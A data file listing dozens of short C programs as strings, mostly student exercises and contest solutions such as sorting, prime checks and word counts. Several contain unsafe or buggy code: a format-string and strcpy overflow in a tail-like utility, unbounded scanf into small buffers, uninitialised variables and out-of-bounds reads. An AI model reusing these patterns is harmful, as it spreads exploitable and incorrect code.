    "#include <stdio.h>\nint main()\n{\n    int salary, merit;\n    printf(\"Enter the salary: \\n\");\n    scanf(\"%d\", &salary);\n    printf(\"Enter the merit: \\n\");\n    scanf(\"%d\", &merit);\n    char grade;\n    if (salary <= 649){\n        if (600 <= salary && 10 <= merit)\n            grade = 'B';\n        else\n            grade = 'C';\n    } else if (salary <= 799) {\n        if (700 <= salary && 20 <= merit)\n            grade = 'A';\n        else\n            grade = 'B';\n    } else {\n        grade = 'A';\n    }\n    printf(\"%c\", grade);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n#include <ctype.h>\nint total_words = 0;\nvoid * count_words(void *);\nint main(int ac, char *av[]) {\n    if (ac != 3) {\n        printf(\"usage: ./twordcount1 file1 file2\\n\");\n        exit(1);\n    }\n    pthread_t t1;\n    pthread_t t2;\n    pthread_create(&t1, ((void*)0), count_words, (void *)av[1]);\n    pthread_create(&t2, ((void*)0), count_words, (void *)av[2]);\n    pthread_join(t1, ((void*)0));\n    pthread_join(t2, ((void*)0));\n    printf(\"%d: total words\\n\", total_words);\n    return 0;\n}\nvoid * count_words(void *f) {\n    char * file_name = (char*)f;\n    FILE * fp = fopen(file_name, \"r\");\n    if (fp == ((void*)0)) {\n        perror(file_name);\n    }\n    int c = (-1);\n    int prev = '\\0';\n    while((c = getc(fp)) != (-1)) {\n        if (!isalnum(c) && isalnum(prev)) {\n            total_words += 1;\n        }\n        prev = c;\n    }\n    fclose(fp);\n    return ((void*)0);\n}",
    "#include <stdio.h>\n#include <locale.h>\n#include <stdio.h>\nvoid assign(){\n    printf(\"+--------------------------------+\\n\");\n    printf(\"| Algoritmo: Insert Sort 1       |\\n\");\n    printf(\"| Autor: Mateus Machado de Souza |\\n\");\n    printf(\"|                                |\\n\");\n    printf(\"| Faculdade de Tecnologia  de    |\\n\");\n    printf(\"| S\u00e3o Jos\u00e9 dos Campos            |\\n\");\n    printf(\"| Ano: 2019                      |\\n\");\n    printf(\"+--------------------------------+\\n\\n\");\n}\n\nvoid\ninsertSort(int v[], int n){\n  int selecionado, i, j;\n  for(int i = 1; i < n ; i++){\n    selecionado = v[i];\n    for(j = i-1; j >= 0 && v[j] > selecionado; j--) v[j+1] = v[j];\n    v[j+1] = selecionado;\n  }\n}\nvoid\nprintVetor(int v[], int n){\n    printf(\"\\n\");\n    printf(\"[\");\n    for(int a = 0; a < n; a++){\n        if (a == n-1 )printf(\"%d\", v[a]);\n        else printf(\"%d, \", v[a]);\n    }\n    printf(\"]\\n\");\n}\nint main(void) {\n  int v[] = {5,2,1,3,6};\n  insertSort(v, sizeof(v)/sizeof(int));\n  printVetor(v, sizeof(v)/sizeof(int));\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    char completo[100];\n    char primeiro[31] = \"Bom\";\n    char segundo[31] = \"Trabalho\";\n    strcat(completo, primeiro);\n    strcat(completo, \" \");\n    strcat(completo, segundo);\n    printf(\"%s\", completo);\n    return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\n#include<string.h>\nint hex_to_dec(unsigned char *data){\n int sum=0;\n int length=strlen(data);\n int i=length-1;\n int j=0;\n while(i>=0){\n  int x = data[i];\n  if(x>=49 && x<=57)x=x-48;\n  if(x==65){\n   x = 10;\n  }else if(x == 66){\n   x = 11;\n  }else if(x== 67){\n   x= 12;\n  }else if(x == 68){\n   x=13;\n  }else if(x == 69){\n   x= 14;\n  }else if(x == 70){\n   x = 15;\n  }\n  sum =sum +x*pow(16,j);\n  i--;\n  j++;\n }\n return sum;\n}\nint main(){\n unsigned char a[10];\n printf(\"Enter a number\\n\");\n scanf(\"%s\",a);\n int result = hex_to_dec(a);\n printf(\"\\nhex_to_dec=%d\\n\",result);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void){\n    int N, M, P, i, j, distance, max_distance = 2;\n    int **person_loc;\n    scanf(\"%d %d %d\", &N, &M, &P);\n    person_loc = (int**) malloc(P * sizeof(int*));\n    for(i = 0; i < P; i++)\n        person_loc[i] = (int*) malloc(2 * sizeof(int));\n    for(i = 0; i < P; i++)\n        scanf(\"%d %d\", &person_loc[i][0], &person_loc[i][1]);\n    for(i = 0; i < P-1; i++){\n        distance = abs(person_loc[i][0] - person_loc[i+1][0]) + abs(person_loc[i][1] - person_loc[i+1][1]);\n        if(distance > max_distance)\n            max_distance = distance;\n    }\n    for(i = 0; i < P && P == 1; i++){\n        distance = abs(person_loc[i][0] - 0) + abs(person_loc[i][1] - 0);\n        max_distance = distance > max_distance ? distance : max_distance;\n        distance = abs(person_loc[i][0] - (N-1)) + abs(person_loc[i][1] - 0);\n        max_distance = distance > max_distance ? distance : max_distance;\n        distance = abs(person_loc[i][0] - 0) + abs(person_loc[i][1] - (M-1));\n        max_distance = distance > max_distance ? distance : max_distance;\n        distance = abs(person_loc[i][0] - (N-1)) + abs(person_loc[i][1] - (M-1));\n        max_distance = distance > max_distance ? distance : max_distance;\n    }\n    printf(\"%d\\n\", max_distance);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n int i,n,n2;\n printf(\"Enter the length\\n\");\n scanf(\"%d\",&n);\n int arr[n];\n for(i=0;i<n;i++){\n  scanf(\"%d\",&arr[i]);\n }printf(\"\\n%d \",n);\n for(i=0;i<n;i++){\n  printf(\"%d  \",10*arr[i]);\n }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <wchar.h>\n#include <errno.h>\n#include <locale.h>\nint main(void) {\n    setlocale(6, \"C-UTF-8\");\n    FILE *fp = fopen(\"fgetwc.dat\", \"w\");\n    if (!fp) {\n        perror(\"Can't open file for writing\");\n        return 1;\n    }\n    printf(\"nchars=%ld\\n\", wcslen(L\"\u043a\u043e\u0448\u043a\u0430\\n\"));\n    fputws(L\"\u043a\u043e\u0448\u043a\u0430\\n\", fp);\n    fclose(fp);\n    fp = fopen(\"fgetwc.dat\", \"r\");\n    if (!fp) {\n        perror(\"Can't open file for reading\");\n        return 1;\n    }\n    wint_t wc;\n    errno = 0;\n    FILE *fp1 = fopen(\"fgetwc.out\", \"w\");\n    while ((wc = fgetwc(fp)) != 0xffffffffU)\n        fputwc(wc, fp1);\n    if (ferror(fp)) {\n        if (errno == (25))\n            puts(\"Character encoding error while reading.\");\n        else\n            puts(\"I/O error when reading\");\n    } else if (feof(fp))\n        puts(\"End of file reached successfully\");\n    fclose(fp);\n    fclose(fp1);\n}",
    "#include <stdio.h>\nint main(void) {\n    int n;\n    while(1)\n    {\n        scanf(\"%d\",&n);\n        if(n==42)\n        {\n            break;\n        }\n        printf(\"%d\\n\",n);\n    }\n return 0;\n}",
    "#include <stdio.h>\ndouble minus(double a, double b);\nint main(int argc, const char * argv[]) {\n    double a = 134.53;\n    double b = 4890.232;\n    double diff;\n    diff = minus(a, b);\n    printf(\"The difference of a and b is: %lf \\n\", diff);\n    return 0;\n}\ndouble minus(double a, double b){\n    return (a - b);\n}",
    "#include <sys/types.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <errno.h>\nint main() {\n if (setuid(0) != 0) {\n  fprintf((stderr), \"Error number: %d\\n\", errno);\n  perror(\"Error string\");\n }\n return 1;\n}",
    "#include <stdio.h>\nint main()\n{\n  int x;\n  int y;\n  int array[8][8];\n  printf( \"Array Indices:\\n\" );\n  for ( x = 0; x < 8; x++ ) {\n   for ( y = 0; y < 8; y++ ) {\n  array[x][y] = x * y;\n  printf( \"[%d][%d]=%d \", x, y, array[x][y] );\n   }\n         printf( \"\\n\" );\n  }\n  getchar();\n}",
    "#include <stdio.h>\nint add_range(int low, int high)\n{\n    int i, sum;\n    for (i = low; i <= high; i++)\n        sum = sum + i;\n    return sum;\n}\nint main(void)\n{\n    int result[100];\n    result[0] = add_range(1, 10);\n    result[1] = add_range(1, 100);\n    printf(\"result[0] = %d\\nresult[1] = %d\\n\", result[0], result[1]);\n    return 0;\n}",
    "#include<stdlib.h>\nint main()\n{\n system(\"am start -n com.android.camera/com.android.camera.Camera\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid check() {\n    printf(\"There is nothing to check\\n\");\n}\nint main() {\n    check();\n    check();\n    check();\n    printf(\"let's get ready for ruuuuumble\\n\");\n    printf(\"first malloc\\n\");\n    if (malloc(1)) {\n        printf(\"second malloc\\n\");\n        if (malloc(2)) {\n            printf(\"third malloc \\n\");\n            malloc(3);\n        }\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <inttypes.h>\nint main(void)\n{\n    printf(\"Ce programme calcule la somme des entiers de 1 a la limite que vous aurez specifiee.\\n\");\n    uint32_t i=1;\n    uint64_t sum=0;\n    uint32_t lim;\n    printf(\"Limite=\");\n    scanf(\"%\" \"u\",&lim);\n    while(i<=lim){\n        sum+=i;\n        i++;\n    }\n    printf(\"Somme des entiers de 1 a %\" \"u\" \"=%\" \"llu\",lim,sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint write_file()\n{\n    FILE *handle;\n    handle = fopen(\"output.txt\", \"w\");\n    if (!handle) {\n        perror(\"open file for writing\");\n        return 1;\n    }\n    fputs(\"A line of text\\n\", handle);\n    fputs(\"Another line of text\\n\", handle);\n    fclose(handle);\n    return 0;\n}\nint read_file()\n{\n    char *line = ((void*)0);\n    ssize_t read;\n    size_t len = 0;\n    FILE *handle;\n    handle = fopen(\"output.txt\", \"r\");\n    if (!handle) {\n        perror(\"open file for reading\");\n        return 1;\n    }\n    while ((read = getline(&line, &len, handle)) != -1) {\n        printf(\"%s\", line);\n    }\n    fclose(handle);\n    free(line);\n    return 0;\n}\nint main(int argc, char **argv)\n{\n    int rc;\n    rc = write_file();\n    if (rc != 0) {\n        return 1;\n    }\n    rc = read_file();\n    if (rc != 0) {\n        return 1;\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int note,hundred,fifty,twenty,ten,five,two,one;\n    scanf(\"%d\",&note);\n    printf(\"%d\\n\",note);\n    hundred=note/100;\n    note=note%100;\n    fifty=note/50;\n    note=note%50;\n    twenty=note/20;\n    note=note%20;\n    ten=note/10;\n    note=note%10;\n    five=note/5;\n    note=note%5;\n    two=note/2;\n    note=note%2;\n    one=note/1;\n    note=note%1;\n    printf(\"%d nota(s) de R$ 100,00\\n\",hundred);\n    printf(\"%d nota(s) de R$ 50,00\\n\",fifty);\n    printf(\"%d nota(s) de R$ 20,00\\n\",twenty);\n    printf(\"%d nota(s) de R$ 10,00\\n\",ten);\n    printf(\"%d nota(s) de R$ 5,00\\n\",five);\n    printf(\"%d nota(s) de R$ 2,00\\n\",two);\n    printf(\"%d nota(s) de R$ 1,00\\n\",one);\n    return 0;\n}",
    "#include <stdio.h>\n#include <time.h>\n#include <stdint.h>\n\nint main(void)\n{\n    time_t epoch = 0;\n    printf(\"%jd seconds since the epoch began\\n\", (intmax_t)epoch);\n    printf(\"%s\", asctime(gmtime(&epoch)));\n}",
    "#include <string.h>\n#include <stdio.h>\n#include <ctype.h>\n#include <stdlib.h>\ntypedef int Item;\n\n\n\n\n\n\nchar *a[500] = {\"nuno\", \"lu\u00eds\", \"alexandre\", \"ana\", \"raquel\", \"beatriz\", \"matilde\"};\nint PartitionStr(int l, int r)\n{\n    int i = l - 1, j = r, mid = l + (r - l) / 2;\n    char v[100];\n    if (strcmp(a[mid], a[l]) < 0)\n        { a[mid] = a[l]; };\n    if (strcmp(a[mid], a[r]))\n        { a[mid] = a[r]; };\n    if (strcmp(a[mid], a[l]))\n        { a[r] = a[l]; };\n    strcpy(v, a[r]);\n    while (i < j)\n    {\n        while (strcmp(a[++i], v) < 0)\n            ;\n        while (strcmp(v, a[--j]) < 0)\n            if (j == l)\n                break;\n        if (i < j)\n            { a[i] = a[j]; };\n    }\n    { a[i] = a[r]; };\n    return i;\n}\nint partition(Item a[], int l, int r)\n{\n    int i = l - 1, j = r, mid = l + (r - l) / 2;\n    Item v;\n    if (((a[mid]) < (a[l])))\n        { Item t = a[mid]; a[mid] = a[l]; a[l] = t; };\n    if (((a[mid]) < (a[r])))\n        { Item t = a[mid]; a[mid] = a[r]; a[r] = t; };\n    if (((a[r]) < (a[l])))\n        { Item t = a[r]; a[r] = a[l]; a[l] = t; };\n    v = a[r];\n    while (i < j)\n    {\n        while (((a[++i]) < (v)))\n            ;\n        while (((v) < (a[--j])))\n            if (j == l)\n                break;\n        if (i < j)\n            { Item t = a[i]; a[i] = a[j]; a[j] = t; };\n    }\n    { Item t = a[i]; a[i] = a[r]; a[r] = t; };\n    return i;\n}\nvoid quicksort(Item a[], int l, int r)\n{\n    int i;\n    if (r <= l)\n        return;\n    i = partition(a, l, r);\n    quicksort(a, l, i - 1);\n    quicksort(a, i + 1, r);\n}\nint main()\n{\n    int a[100] = {1, 27, 10, 4, 2, 19, 7, 2, 7};\n    int i;\n    quicksort(a, 0, 6);\n    for (i = 0; i < 7; i++)\n        printf(\"%d\\n\", a[i]);\n    return 0;\n}",
    "#include <stdlib.h>\n\n\n\nint static_var = 1;\nint foo(int n) {\n  int sum = 0;\n  int i, j;\n  for (j = 0; j < n; j++) {\n    for (i = 0; i < n; i++) {\n      sum = (sum + i) + 7842;\n    }\n  }\n  static_var++;\n  return sum;\n}\nint start(int a) {\n  int n = 10;\n  return foo(n + a);\n}\nint main() {\n  int res = 0;\n  res += start(1);\n  res += start(2);\n  return (res + start(3)) % 128;\n}",
    "#include <limits.h>\n#include <stdio.h>\n#include <string.h>\n\nstatic unsigned long long buffer[1000];\nunsigned long long factorial(int number)\n{\n if (buffer[number] == (9223372036854775807LL*2ULL+1ULL))\n {\n  return buffer[number] = number * factorial(number - 1);\n }\n else\n {\n  return buffer[number];\n }\n}\nint main()\n{\n memset(buffer, 0xFF, sizeof(unsigned long long) * 1000);\n buffer[0] = 0;\n buffer[1] = 1;\n while (1)\n {\n  printf(\"Number(Exit: -1): \");\n  int number;\n  scanf(\" %d\", &number);\n  if (number == -1)\n  {\n   break;\n  }\n  printf(\"%llu\\n\", factorial(number));\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, const char * argv[]) {\n    printf(\"Hello, World!\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nchar cmd[128];\nchar args[5][128];\nchar line[1024][1024];\nint main(int argc,char** args)\n{\n    int i;\n    char filename[128];\n    int li=10;\n    if(argc>=2)\n    {\n        sscanf(args[1],\"%d\",&li);\n        li=-li;\n        strcpy(filename,args[2]);\n    }\n    else\n    {\n        strcpy(filename,args[1]);\n    }\n    FILE *F=fopen(filename,\"r\");\n    if(F==((void*)0))\n    {\n        printf(\"%s\\n\",args[1]);\n        return 0;\n    }\n    int p=0;\n    while(fgets(line[p],1024,F))\n    {\n        p++;\n    }\n    for(i=li;i>0;i--)\n        printf(line[p-i]);\n    fclose(F);\n    return 0;\n}",
    "#include <stdio.h>\nint rec(int i){\n    if(i==0)\n        return 1;\n    else\n        return i+rec(i-1);\n}\nint main(){\n    int x = rec(5);\n    printf(\"Ret: %d\\n\", x);\n    return x;\n}",
    "int main(){\n  int a[10][10];\n  a[0][1] = 100;\n  return a[0][1];\n}",
    "#include <stdio.h>\nint main() {\n  int nums [200] = {1993, 1715, 1997, 1666, 1676, 1830, 1203, 1800, 1125, 1191, 1902, 1972, 1471, 1137, 2003, 1250, 1548, 1070, 1152, 2004, 1127, 1111, 1898, 1848, 1934, 1236, 1704, 1950, 1387, 1713, 1214, 1266, 1114, 1089, 1677, 1207, 1341, 1689, 1772, 1901, 1932, 1645, 1285, 1884, 883, 1291, 1543, 1455, 1213, 1088, 1784, 1506, 1879, 1811, 1880, 994, 1021, 1585, 1662, 1683, 1071, 1643, 1754, 1389, 1124, 1820, 1168, 1875, 1017, 1180, 1375, 1359, 1311, 1357, 1501, 1719, 1584, 1609, 1977, 1786, 1232, 1263, 1748, 1664, 1693, 1766, 1598, 1053, 1277, 1466, 1877, 1844, 1829, 1165, 1606, 1298, 1963, 1873, 1911, 1729, 1418, 1372, 1777, 1371, 1588, 1329, 1029, 1931, 1115, 1810, 1595, 1237, 1282, 1838, 1642, 1937, 1343, 1578, 1425, 1814, 1690, 1129, 1321, 1174, 1863, 1405, 1066, 1220, 1780, 1410, 1156, 1991, 1568, 1368, 99, 1750, 1280, 1400, 1601, 1804, 1363, 1613, 1252, 1434, 1094, 1867, 1542, 1093, 1926, 1251, 1348, 689, 1441, 1913, 1969, 1409, 1201, 1459, 1110, 1452, 1051, 1860, 1346, 1537, 1060, 1182, 1386, 1141, 1184, 1989, 1852, 1097, 1135, 1078, 1587, 1984, 1970, 1259, 1281, 1092, 1294, 1233, 1186, 1555, 1755, 1886, 1030, 1706, 1313, 1481, 1998, 1181, 1244, 1269, 1684, 1798, 1023, 1960, 1050, 1293};\n  for (int i = 0; i < 200; i++)\n  {\n    int i_val = nums[i];\n    for (int j = i + 1; j < 200; j++)\n    {\n      int j_val = nums[j];\n      for (int k = j + 1; k < 200; k++)\n      {\n        int k_val = nums[k];\n        if (i_val + j_val + k_val == 2020)\n        {\n          printf(\"%d %d %d %d\\n\", i_val, j_val, k_val, i_val * j_val * k_val);\n          return 0;\n        }\n      }\n    }\n  }\n  return 1;\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <assert.h>\n#include <limits.h>\n#include <stdbool.h>\nvoid solve(int n, int k) {\n        if(k == 0) {\n                for(int i = 1; i <= n; i++) {\n                        printf(\"%d \", i);\n                }\n        } else if(k == 1 && n != 3) {\n                for(int i = n; i > 0 && i <= n; i--) {\n                        printf(\"%d \", i);\n                }\n        } else if(k * 2 == n){\n                for(int i = k+1; i <= n; i++) {\n                        printf(\"%d \", i);\n                }\n                for(int i = 1; i <= k; i++) {\n                        printf(\"%d \", i);\n                }\n        } else {\n                puts(\"-1\");\n                return;\n        }\n        puts(\"\");\n}\nint main(){\n        int t;\n        scanf(\"%d\",&t);\n        for(int i = 0; i < t; i++){\n                int n;\n                int k;\n                scanf(\"%d %d\",&n,&k);\n                solve(n, k);\n        }\n        return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int i = 0;\n long int a = 0, b = 1, next;\n while (i < 50)\n {\n  next = a + b;\n  a = b;\n  b = next;\n  printf(\"%lu\", next);\n  if (i < 49)\n  {\n   printf(\", \");\n  }\n  i++;\n }\n putchar('\\n');\n return (0);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main()\n{\n    int a, b;\n    scanf(\"%d\", &a);\n    scanf(\"%d\", &b);\n    int s = a + b;\n    int d = a - b;\n    float a1, b1;\n    scanf(\"%f\", &a1);\n    scanf(\"%f\", &b1);\n    float s1 = a1 + b1;\n    float d1 = a1 - b1;\n    printf(\"%d\", s);\n    printf(\"%s\", \" \");\n    printf(\"%d\\n\", d);\n    printf(\"%.1f\", s1);\n    printf(\"%s\", \" \");\n    printf(\"%.1f\", d1);\n    return 0;\n}",
    "static void Foo(){\n    int i = 0;\n    for(i = 0; i < 100; i++)\n        ;\n}\nint main(){\n    int i = 1;\n    if( i ) {\n        i++;\n    } else {\n        if( i > 100 ) {\n            while(i<100) {\n                i--;\n                i++;\n                i--;\n                i++;\n                if( i )\n                    i++;\n                else if (i <20 )\n                    i++; }\n        } else {\n            i ++;\n        }\n    }\n    Foo();\n    i = 1;\n    while(i < 0) i++;\n    i = 1;\n    while(i < 0)\n        i++;\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n int a = 0x0; int b = 0x0; int max = 0x0;\n printf(\"Dammi primo intero\");\n scanf(\"%d\", &a);\n printf(\"Dammi secondo intero\");\n scanf(\"%d\", &b);\n if( a == b){ printf(\"A e B sono uguali\"); return 0; }\n a = (a > b) ? printf(\"A \u00e8 maggiore di b. a = %d\\n\", a) : printf(\"B \u00e8 maggiore di a. b = %d\\n\", a);\n return 0;\n}",
    "static const int N = 12;\nint nSlip;\nint main ()\n{\n  int i, j, k, fdot = 0;\n  int a[N][N];\n  for ( i = 1; i < nSlip; i++)\n    {\n      for ( j = i+1; j < nSlip; j++)\n        {\n          for ( k = 0; k < i; k++)\n            fdot += a[i][k] * a[k][j];\n          a[i][j] = a[i][j] - fdot;\n        }\n   }\n  return 0;\n}",
    "#include<stdio.h>\nint check_prime(int num){\n    for (int j=2 ; j<num ; j++){\n        if(num%j==0){\n            break ;\n        }\n        if(num%j!=0){\n            if (j==num-1){\n               printf(\"%d \",num) ;\n            }\n        }\n    }\n}\nint main(){\n    int n1 , n2 , num, j;\n    scanf(\"%d %d\",&n1 , &n2);\n    if (n1 <=2){\n        printf (\"%d \",2);\n    }\n    for (num = n1 ; num <=n2 ; num++){\n    check_prime(num);\n    }\n    return 0 ;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\ndouble *Remonte(double A[10][10], double B[10], int n)\n{\n double *X;\n        X = malloc(sizeof(double) * n);\n        int i,j;\n        double s;\n        X[n-1] = B[n-1] / A[n-1][n-1];\n        for(i = n - 2; i >= 0; i--)\n        {\n                s=0;\n                for(j = i + 1; j <= n - 1; j++)\n                        s += A[i][j] * X[j];\n                X[i] = (B[i] - s) / A[i][i];\n        }\n   return (X);\n}\ndouble *Gauss(double A[10][10] ,double B[10], int n)\n{\n   int i,j,k;\n        double f;\n        double *X;\n        X = malloc(sizeof(double) * n);\n        for(k = 0;k <= n - 1; k++)\n        {\n                for(i = k + 1; i <= n; i++)\n                {\n                        f = A[i][k] / A[k][k];\n                        for(j = k + 1; j <= n; j++)\n                                A[i][j] = A[i][j] - f * A[k][j];\n                        B[i] = B[i] - f * B[k];\n                }\n        }\n   X = Remonte(A, B, n);\n     return(X);\n}\nint main()\n{\n   double A[10][10], B[10];\n   double *X;\n   int i,j,n;\n   printf(\"Enter the size of the matrix: \");\n   scanf(\"%d\", &n);\n   printf(\"Filling the matrix A\\n\");\n   for( i = 0; i < n; i++)\n   {\n      for(j = 0; j < n; j++)\n      {\n         printf(\"A[%d][%d] = \", i, j);\n         scanf(\"%lf\", &A[i][j]);\n      }\n   }\n   printf(\"Filling the matrix B\\n\");\n   for (i = 0; i < n; i++)\n   {\n      printf(\"B[%d] = \", i);\n      scanf(\"%lf\", &B[i]);\n   }\n X = Gauss(A, B, n);\n    printf(\"\\nThe solution is : \");\n        for (i = 0; i < n; i++)\n                 printf(\"%lf\\n\", X[i]);\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned char ucXXX;\n    unsigned short usXXX;\n    unsigned int uiXXX;\n    unsigned long ulXXX;\n    ucXXX = 0xfe;\n    usXXX = 0xfedc;\n    uiXXX = 0xfedcba98;\n    ulXXX = 0xfedaba9876543210;\n    printf(\"%%d of ucXXX: %d.\\n\", ucXXX);\n    printf(\"%%ld of ucXXX: %ld.\\n\", ucXXX);\n    printf(\"%%u of ucXXX: %u.\\n\", ucXXX);\n    printf(\"%%lu of ucXXX: %lu.\\n\", ucXXX);\n    printf(\"%%x of ucXXX: %x.\\n\", ucXXX);\n    printf(\"%%lx of ucXXX: %lx.\\n\", ucXXX);\n    printf(\"%%d of usXXX: %d.\\n\", usXXX);\n    printf(\"%%ld of usXXX: %ld.\\n\", usXXX);\n    printf(\"%%u of usXXX: %u.\\n\", usXXX);\n    printf(\"%%lu of usXXX: %lu.\\n\", usXXX);\n    printf(\"%%x of usXXX: %x.\\n\", usXXX);\n    printf(\"%%lx of usXXX: %lx.\\n\", usXXX);\n    printf(\"%%d of uiXXX: %d.\\n\", uiXXX);\n    printf(\"%%ld of uiXXX: %ld.\\n\", uiXXX);\n    printf(\"%%u of uiXXX: %u.\\n\", uiXXX);\n    printf(\"%%lu of uiXXX: %lu.\\n\", uiXXX);\n    printf(\"%%x of uiXXX: %x.\\n\", uiXXX);\n    printf(\"%%lx of uiXXX: %lx.\\n\", uiXXX);\n    printf(\"%%d of ulXXX: %d.\\n\", ulXXX);\n    printf(\"%%ld of ulXXX: %ld.\\n\", ulXXX);\n    printf(\"%%u of ulXXX: %u.\\n\", ulXXX);\n    printf(\"%%lu of ulXXX: %lu.\\n\", ulXXX);\n    printf(\"%%x of ulXXX: %x.\\n\", ulXXX);\n    printf(\"%%lx of ulXXX: %lx.\\n\", ulXXX);\n    return 0;\n}",
    "#include<stdio.h>\n#include<ctype.h>\nint main(){\n char s;\n scanf(\"%c\", &s);\n printf(\"%c\\n\", toupper(s));\n return 0;\n}",
    "#include <stdio.h>\nint get_int() {\n    int ch, i;\n    while (((ch = getchar()) == ' ') || (ch == '\\n'));\n    for (i = 0; ch >= '0' && ch <= '9'; ch = getchar() ) i = (i<<3)+(i<<1)+(ch-'0');\n    return i;\n}\nint p, s;\nint t[3];\nint pos[11], paused[11];\nint n;\nint main() {\n    int i, j, k, l, d1, d2;\n    for (; p = get_int(), s = get_int(), p+s; ) {\n        for (i = 0; i < 3; i++) t[i] = get_int();\n        for (i = 0; i < p; i++) pos[i] = 0, paused[i] = 0;\n        for (n = get_int(), i = j = 0; i < n; ) {\n            if (paused[j]) { paused[j] = 0; j=(j+1)%p; continue; }\n            d1 = get_int(); d2 = get_int(); k = d1+d2; i++;\n            pos[j]+=k; if (pos[j]>s) break;\n            for (l = 0; l < 3; l++) if (t[l]==pos[j]) paused[j] = 1;\n            j=(j+1)%p;\n        }\n        while (i < n) {get_int(); get_int(); i++; }\n        printf(\"%d\\n\", j+1);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar ip1[100];\nchar ip2[100];\nchar mask[100];\nint ipsection1[4];\nint ipsection2[4];\nint masksection[4];\nint filter_section(char *s, int *section)\n{\n    int i, len;\n    char *s1, *s2, *s3, *s4, *pos;\n    s1 = s;\n    pos = s1;\n    while(*pos != '.') {\n        pos++;\n    }\n    *pos = '\\0';\n    sscanf(s1, \"%d\", &section[0]);\n    s2 = pos + 1;\n    pos = s2;\n    while(*pos != '.') {\n        pos++;\n    }\n    *pos = '\\0';\n    sscanf(s2, \"%d\", &section[1]);\n    s3 = pos + 1;\n    pos = s3;\n    while(*pos != '.') {\n        pos++;\n    }\n    *pos = '\\0';\n    sscanf(s3, \"%d\", &section[2]);\n    s4 = pos + 1;\n    sscanf(s4, \"%d\", &section[3]);\n    return 0;\n}\nint main(void)\n{\n    int i, same = 1;\n    while(1) {\n        same = 1;\n        if (scanf(\"%s\", ip1) == (-1)) {\n            break;\n        }\n        if (scanf(\"%s\", ip2) == (-1)) {\n            break;\n        }\n        if (scanf(\"%s\", mask) == (-1)) {\n            break;\n        }\n        filter_section(ip1, ipsection1);\n        filter_section(ip2, ipsection2);\n        filter_section(mask, masksection);\n        for (i = 0; i < 4; i++) {\n            if ((ipsection1[i] & masksection[i]) != (ipsection2[i] & masksection[i])) {\n                same = 0;\n                break;\n            }\n        }\n        if (same)\n            printf(\"Same ip\\n\");\n        else\n        {\n            printf(\"Not same ip\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint sum(int t[15])\n{\n  int res = 0;\n  int i;\n  for(i=0; i<15; i++){\n    res += t[i];\n  }\n  return res;\n}\nint main(void)\n{\n  int t[10] = {6};\n  int s;\n  s = sum(t);\n  printf(\"%d\\n\", s);\n}",
    "#include <stdio.h>\nint bending(int a[], int n, int op)\n{\n    int m = n;\n    for (int i = 0; i < op; i++)\n    {\n        for (int i = 0; i < m / 2; i++)\n        {\n            a[i] = a[i] + a[n - 1];\n            n = n - 1;\n        }\n        m = n;\n    }\n    for (int i = 0; i < m; i++)\n    {\n        printf(\"%d \", a[i]);\n    }\n}\nint main()\n{\n    int n;\n    scanf(\"%d\", &n);\n    int a[n];\n    for (int i = 0; i < n; i++)\n    {\n        scanf(\"%d\", &a[i]);\n    }\n    int op;\n    scanf(\"%d\", &op);\n    bending(a, n, op);\n}",
    "#include <stdio.h>\nint main(){\n int a,b,c,r;\n int aux1,aux2;\n printf(\"Ingrese el 1 numero\\n\");\n scanf(\"%d\",&aux1);\n printf(\"Ingrese el 2 numero\\n\");\n scanf(\"%d\",&aux2);\n if(aux2<aux1){\n  a=aux1;\n  b=aux2;\n }else\n if(aux1<aux2){\n  a=aux2;\n  b=aux1;\n }else\n if(aux1==aux2){\n  a=aux1;\n  b=aux2;\n }\n int bandera=0;\n int res=0;\n do{\n  r=a%b;\n  a=b;\n  b=r;\n }while(r!=0);\n printf(\"El MCD es: %d\",a);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int r,n,s=0;\n    printf(\"Enter the number: \");\n    scanf(\"%d\",&n);\n    if (n<=32767&&n>0)\n    {\n        do\n        {\n            r=n%10;\n            s=s+r;\n            n=n/10;\n        }while(n!=0);\n        printf(\"The sum is %d\",s);\n    }\n    else\n        printf(\"Wrong Entry!!\");\n    return 0;\n}",
